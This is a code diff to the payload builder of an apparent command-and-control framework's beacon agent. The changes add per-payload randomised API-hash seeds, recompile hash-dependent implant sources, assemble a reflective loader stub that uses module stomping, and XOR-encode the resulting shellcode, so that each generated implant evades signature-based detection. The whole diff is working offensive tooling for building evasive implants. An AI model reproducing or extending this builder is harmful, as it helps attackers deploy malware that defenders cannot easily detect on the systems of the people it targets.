@@ -302,6 +302,14 @@ var (
 	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
 )
 
+var seedDependentFiles = map[string]bool{
+	"ProcLoader": true,
+	"ApiLoader":  true,
+	"Boffer":     true,
+	"bof_loader": true,
+	"Commander":  true,
+}
+
 func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
 	var agentProfiles [][]byte
 
@@ -577,6 +585,15 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		return nil, "", err
 	}
 
+	seed := cryptoRandUint32()
+	err = os.WriteFile(currentDir+"/beacon/ApiDefines.h", []byte(generateApiDefines(seed)), 0644)
+	if err != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", err
+	}
+	cFlags += fmt.Sprintf(" -DDJB2_SEED=%dU", seed)
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("DJB2 seed: 0x%08x", seed))
+
 	protocol, _ := listenerMap["protocol"].(string)
 	if protocol == "http" {
 		ObjectDir = ObjectDir_http
@@ -629,13 +646,58 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	}
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "Configuration compiled successfully")
 
-	Files := tempDir + "/config.o "
-	Files += ObjectDir + "/" + ConnectorFile + Ext + " "
-	for _, ofile := range ObjectFiles {
-		Files += ObjectDir + "/" + ofile + Ext + " "
+	beaconDefine := ""
+	switch protocol {
+	case "http":
+		beaconDefine = "-DBEACON_HTTP"
+	case "bind_smb":
+		beaconDefine = "-DBEACON_SMB"
+	case "bind_tcp":
+		beaconDefine = "-DBEACON_TCP"
+	case "dns":
+		beaconDefine = "-DBEACON_DNS"
+	}
+
+	recompileFiles := []string{ConnectorFile}
+	for name := range seedDependentFiles {
+		recompileFiles = append(recompileFiles, name)
 	}
 	if protocol == "dns" {
-		Files = appendDNSObjectFiles(Files, ObjectDir, Ext)
+		recompileFiles = append(recompileFiles, "DnsCodec")
+	}
+
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Recompiling hash-dependent files with per-payload seed...")
+	for _, srcFile := range recompileFiles {
+		srcPath := "beacon/" + srcFile + ".cpp"
+		outPath := tempDir + "/" + srcFile + Ext
+		cmdRecomp := fmt.Sprintf("%s %s %s %s -o %s", Compiler, cFlags, beaconDefine, srcPath, outPath)
+		var recompArgs []string
+		recompArgs = append(recompArgs, "-c", cmdRecomp)
+		err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", recompArgs...)
+		if err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", err
+		}
+	}
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "Hash-dependent files recompiled")
+
+	recompiledSet := make(map[string]bool)
+	for _, f := range recompileFiles {
+		recompiledSet[f] = true
+	}
+
+	Files := tempDir + "/config.o "
+	Files += tempDir + "/" + ConnectorFile + Ext + " "
+	for _, ofile := range ObjectFiles {
+		if recompiledSet[ofile] {
+			Files += tempDir + "/" + ofile + Ext + " "
+		} else {
+			Files += ObjectDir + "/" + ofile + Ext + " "
+		}
+	}
+	if protocol == "dns" {
+		Files += tempDir + "/DnsCodec" + Ext + " "
+		Files += ObjectDir + "/miniz" + Ext + " "
 	}
 
 	if generateConfig.Format == "Exe" {
@@ -722,17 +784,66 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	if err != nil {
 		return nil, "", err
 	}
-	_ = os.RemoveAll(tempDir)
 
 	if generateConfig.Format == "Shellcode" {
-		stubContent, err := os.ReadFile(stubPath)
-		if err != nil {
-			return nil, "", err
+		if generateConfig.Arch == "x64" {
+			stubHashes := computeStubHashes(seed)
+			nasmSrc := "files/stub_rdi.x64.asm"
+			stubBinPath := tempDir + "/stub.x64.bin"
+			nasmDefines := fmt.Sprintf("-DDJB2_SEED=%d -DHASH_MOD_NTDLL=0x%x -DHASH_MOD_KERNEL32=0x%x "+
+				"-DHASH_NTCREATESECTION=0x%x -DHASH_NTMAPVIEWOFSECTION=0x%x "+
+				"-DHASH_NTPROTECTVIRTUALMEMORY=0x%x -DHASH_NTCLOSE=0x%x "+
+				"-DHASH_LOADLIBRARYA=0x%x -DHASH_GETPROCADDRESS=0x%x "+
+				"-DHASH_FLUSHINSTRUCTIONCACHE=0x%x -DHASH_FREELIBRARY=0x%x "+
+				"-DHASH_LOADLIBRARYEXA=0x%x -DMODULE_STOMP",
+				seed,
+				stubHashes.ModNtdll, stubHashes.ModKernel32,
+				stubHashes.NtCreateSection, stubHashes.NtMapViewOfSection,
+				stubHashes.NtProtectVirtualMem, stubHashes.NtClose,
+				stubHashes.LoadLibraryA, stubHashes.GetProcAddress,
+				stubHashes.FlushInstructionCache, stubHashes.FreeLibrary,
+				stubHashes.LoadLibraryExA)
+			nasmCmd := fmt.Sprintf("nasm -f bin %s %s -o %s", nasmDefines, nasmSrc, stubBinPath)
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Assembling reflective loader stub with per-payload hashes...")
+			var nasmArgs []string
+			nasmArgs = append(nasmArgs, "-c", nasmCmd)
+			err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", nasmArgs...)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+			stubContent, err := os.ReadFile(stubBinPath)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+			rawShellcode := append(stubContent, buildContent...)
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Stub: %d bytes, raw shellcode: %d bytes", len(stubContent), len(rawShellcode)))
+
+			Payload, err = xorEncodeShellcode(rawShellcode, "x64")
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, fmt.Sprintf("XOR-encoded shellcode: %d bytes", len(Payload)))
+		} else {
+			stubContent, err := os.ReadFile(stubPath)
+			if err != nil {
+				return nil, "", err
+			}
+			rawShellcode := append(stubContent, buildContent...)
+
+			Payload, err = xorEncodeShellcode(rawShellcode, "x86")
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, fmt.Sprintf("XOR-encoded shellcode: %d bytes", len(Payload)))
 		}
-		Payload = append(stubContent, buildContent...)
 	} else {
 		Payload = buildContent
 	}
+	_ = os.RemoveAll(tempDir)
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(Payload)))
 
 	/// END CODE HERE
